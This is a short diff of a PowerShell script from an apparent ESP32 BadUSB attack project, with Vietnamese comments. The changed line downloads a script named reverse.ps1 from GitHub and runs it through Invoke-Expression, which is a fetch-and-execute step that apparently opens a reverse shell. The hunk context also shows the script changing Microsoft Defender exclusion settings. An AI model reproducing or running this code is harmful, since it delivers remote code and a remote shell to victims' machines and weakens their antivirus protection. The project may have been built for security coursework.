@@ -301,7 +301,7 @@ Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinu
 
 try {
     # Tải và chạy reverse.ps1 từ GitHub
-    Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/khangpham/src/reverse.ps1" -UseBasicParsing).Content
+    Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/main/src/reverse.ps1" -UseBasicParsing).Content
 } catch {
     # Nếu không tải được thì chạy trực tiếp
     Write-Host "Cannot load reverse.ps1" -ErrorAction SilentlyContinue
